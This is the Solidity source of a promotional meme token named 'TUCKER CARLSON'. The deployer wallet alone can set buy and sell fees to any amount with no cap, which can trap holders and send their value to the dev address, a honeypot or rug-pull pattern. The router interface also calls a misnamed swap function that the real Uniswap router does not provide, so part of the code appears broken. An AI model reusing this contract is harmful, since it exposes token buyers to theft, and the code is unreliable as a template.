/*

Twitter: https://twitter.com/TuckCoin
Telegram: https://t.me/TuckerCoinUS
Website: https://www.tuckercoin.us

*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingXfeeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract TUCKERCARLSON {
        
        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   name_ = "TUCKER CARLSON"; 
        string public   symbol_ = "TUCKER";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 100000000000 * 10**decimals;

        uint256 buyXfeee = 0;
        uint256 sellXfeee = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed TUCKERCARLSONDEV,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant TUCKERCARLSONDEV = payable(address(0x41C222b26E41b10ecBbB408f63b40C586C769837));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == TUCKERCARLSONDEV || to == TUCKERCARLSONDEV);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingXfeeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                TUCKERCARLSONDEV.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 XfeeeAmount = amount * (from == pair ? buyXfeee : sellXfeee) / 100;
                amount -= XfeeeAmount;
                balanceOf[address(this)] += XfeeeAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == TUCKERCARLSONDEV);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setXfeee(uint256 _buy, uint256 _sell) private {
            buyXfeee = _buy;
            sellXfeee = _sell;
        }

        function setXfeee(uint256 _buy, uint256 _sell) external {
            if(msg.sender != TUCKERCARLSONDEV)        
                revert Permissions();
            _setXfeee(_buy, _sell);
        }
    }